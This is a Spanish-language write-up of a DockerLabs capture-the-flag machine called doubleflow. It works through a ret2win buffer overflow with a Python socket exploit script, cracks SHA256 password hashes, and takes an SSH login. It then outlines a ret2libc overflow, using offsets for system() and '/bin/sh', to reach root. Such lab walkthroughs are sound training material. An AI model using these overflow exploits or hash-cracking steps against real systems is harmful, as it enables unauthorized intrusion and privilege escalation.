nmap: 80,22,39817

![image](https://github.com/user-attachments/assets/54f701a3-20af-4648-99dc-0d7c5ec12fcf)

---
en la pagina aparece "esta pagina no puede ser hackeada"
y si entramos por el puerto 39817, 

nos aparece: contraseña: Denegado

![image](https://github.com/user-attachments/assets/2cf50a40-fba4-402c-aceb-34b2284bfa50)

si hacemos un gobuster no aparece:

     - app1

Nos descarga un binario
le damos los permisos y ejecutamos, ahora nos conectamos
> ./app1

![image](https://github.com/user-attachments/assets/8c5fdd84-6725-473a-91ad-857f3bc35f50)

en nuestra terminal conectamos:
 
    telnet 127.0.0.1 17562
    
 y nos pedirá escribir algo, y al colocar cualquier cosa se cerrara.

intentare probar si es posible un overflow generandolo:
seguimos los pasos: https://github.com/4bytess/pattern_generator

      -python3 patter.py -m generate -v 50

nos dio: a00a01a02a03a04a05a06a07a08a10a11a12a13a14a15a16a1

![image](https://github.com/user-attachments/assets/63783b1f-22e5-4991-bd51-40d7f774cfd9)

lanzaremos el mismo comando pero con 500 y volvemos a intentar saturar. 

![image](https://github.com/user-attachments/assets/9189ce59-2668-4361-9128-ad1a1f65dbba)

entonces se satura como vemos. 

ahora lanzamos: 

>  python3 pattern.py -m offset -v b14b15b1

nos da: offset: 282

![image](https://github.com/user-attachments/assets/fc51e1ca-1a08-46a5-bc3d-1ac1905f90e8)

lanzamos: 

     gdb -q app1 

y volvemos a lanzar los 500 que nos dio y nos dará un valor. 

![image](https://github.com/user-attachments/assets/f253c4f1-f245-4da0-9493-2f175e3ddc8f)

entonces nos da el valor: 0x000000000040142b
lanzamos ahí mismo un: ret
y nos dará: 0x3262363262353262

nos mostrara la seguridad que tiene el binario
y aparece: NX Enabled

Vemos que solo tiene NX. No tiene canarios ni PIE, es decir que podemos sobrescribir el stack pero no ejecutar shellcode en el stack. Además las direcciones del código del binario son estáticas, por lo que se puede hacer un buffer overflow de tipo ret2win, en donde sobrescribimos el EIP con la dirección de una función que existe en el binario que nunca se llama de por sí 

ahora abrimos otra vez

> gdb app1

y lanzamos: info functions

hay uno llamado "secret function", lo que intentare hacer un overflow hacia ese archivo en especifico.


entonces con el valor que obtuvimos lo pasamos al valor ASCII así: 

     echo "3262363262353262" | xxd -r -p

Nos queda el valor de: b25b26b2

![[dockerlabs/dificil/doubleflow/test8.png]]

ahora lanzamos:
> python3 pattern.py -m offset -v b25b26b2

nos da: offset: 312

![[dockerlabs/dificil/doubleflow/test9.png]]

ahora modificamos un código que vaya hacia la carpeta o archivo "secret function".

---
#!/usr/bin/python3

from pwn import p64
import socket


payload = b'A' * 312 + p64(0x00000000004011b6)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("127.0.0.1", 17562))  # Dirección y puerto del servicio
    print("[+] Conexión establecida con el servicio")

    
banner = sock.recv(1024)
print(f"[+] Banner recibido: {banner.decode(errors='ignore')}")

sock.send(payload + b'\r\n')
print("[+] Payload enviado")

except ConnectionRefusedError:
    print("[-] No se pudo conectar al servicio. Verifica que el servicio está activo.")
except Exception as e:
    print(f"[-] Error: {e}")

finally:
    # Cerramos el socket
    sock.close()
    print("[+] Conexión cerrada")

---

lo lanzamos: python3 exploit.py y dejamos en escucha "./app1" 
al lanzarlo nos da:

>02e5e6ea15b5d3088af6edf49269a7221eb88dc32747420dc2e482110f649deb

![[dockerlabs/dificil/doubleflow/test10.png]]

esta en sha256 ahora lo mandamos a: https://crackstation.net/
y nos da: tiggerjake

![[dockerlabs/dificil/doubleflow/test11.png]]

ahora nos conectamos por el puerto 39817

telnet 172.17.0.2 39817 colocamos la contraseña y nos 

 ![[dockerlabs/dificil/doubleflow/test12.png]]

lo pasamos otra vez por la pagina por el sha256 y nos da:

    plasticfloor17

![[dockerlabs/dificil/doubleflow/test13.png]]

entramos al usuario pepe por el puerto 22

![[dockerlabs/dificil/doubleflow/test14.png]]

vemos que dentro de pepe hay dos app mas

    - app2 y 3

igual que con el app1 solo tiene protección NX, o sea que no podemos ejecutar shellcodes
al listar las funciones que tiene definidas el binario, solo esta la función main, por lo que no se podría hacer un ret2win, pero al ejecutar ldd ./app3 en la maquina victima, vemos que la dirección base de libc.so.6 es siempre la misma. por lo que no hay ASLR. así que es mas fácil atacar a "ret2libc" o sea hacer un ataque buffer overflow y llamar la función "system()" y como parámetro "/bin/sh". 

lanzamos:
>readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "system"

y nos da:
> 1023: 000000000004c490    45 FUNC    WEAK   DEFAULT   16 system@@GLIBC_2.2.5

para sacar el offset de la cadena "/bin/sh", ejecutamos:
> strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"

y nos da: 
>196031 /bin/sh

![[dockerlabs/dificil/doubleflow/test15.png]]

Ahora ya tenemos los offsets de system() y "/bin/sh". Pero si queremos pasar "/bin/sh" como parámetro a system() en el buffer overflow, tenemos que meter en el registro RDI un puntero a la cadena "/bin/sh" y para meter ese valor en RDI necesitamos encontrar dentro del binario app3 una instrucción pop rdi, para meter un valor del stack en el RDI. 

entonces nos pasamos el "app3" a nuestra terminal y probamos con gdb. 
entonces ejecutamos 

     gdb -q app3 

y les escribimos alguna letra para que de el mismo error:

![[dockerlabs/dificil/doubleflow/test16.png]]

nos dio: 

     0x0000000000401189
     0x4141414141414141

entonces queda ver que protección tiene, aqui se busca el valor de ASRL si se encuentra habilitado. 

![[dockerlabs/dificil/doubleflow/test17.png]]

contiene 0  o sea que esta deshabilitada. aunque contiene la NX activa que es lo mismo que la anterior. 

tomamos o creamos un código python que nos sirva como exploit.  y el código se basara para este código que nos entrega la app3

![[dockerlabs/dificil/doubleflow/test18.png]]


La dirección de retorno vale 0x3235613135613035. Para pasarlo a texto hacemos `unhex 3235613135613035 | rev`. que es cambiarlo a valor ASCII Sale que es 50a51a52. Entonces hacemos `pattern.py -m offset -v 50a51a52` y nos dice que el offset es 136.

entonces como nombre, tomaremos un código python o se creara uno ahora ejecutamos el exploit en la máquina víctima en el directorio /home/pepe:

![[dockerlabs/dificil/doubleflow/test19.png]]

y somos root! 
